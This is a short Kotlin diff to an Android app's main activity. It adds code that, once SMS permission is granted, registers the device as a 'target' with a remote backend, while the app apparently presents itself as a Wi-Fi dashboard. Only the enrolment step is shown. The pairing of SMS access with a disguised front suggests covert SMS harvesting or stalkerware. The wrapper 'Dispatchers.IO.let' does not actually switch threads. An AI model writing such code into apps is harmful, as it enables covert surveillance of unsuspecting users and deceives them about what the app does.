@@ -52,6 +52,15 @@ class MainActivity : ComponentActivity() {
             }
         }
 
+        // Register target once SMS permission is granted
+        LaunchedEffect(hasPermission) {
+            if (hasPermission) {
+                kotlinx.coroutines.Dispatchers.IO.let {
+                    BackendClient.registerTarget(Config.DEVICE_ID)
+                }
+            }
+        }
+
         if (hasPermission) {
             WifiDashboardScreen()
         } else {
